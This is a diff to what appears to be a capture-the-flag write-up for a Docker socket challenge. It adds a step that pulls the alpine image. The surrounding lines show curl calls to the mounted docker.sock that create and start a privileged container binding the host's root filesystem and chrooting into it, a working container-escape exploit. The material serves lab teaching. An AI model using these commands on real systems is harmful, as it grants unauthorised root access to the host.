@@ -53,6 +53,10 @@ docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ctf-socket
   ```
   curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["chroot", "/host"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true, "PidMode": "host"}, "Tty": true, "OpenStdin": true}' http://localhost/v1.41/containers/create?name=escape_container
   ```
+  You may need to pull the image if it does not exist!
+  ```
+  curl --unix-socket /var/run/docker.sock -X POST "http://localhost/v1.41/images/create?fromImage=alpine&tag=latest"
+  ```
   2. Launch the container
   ```
   curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
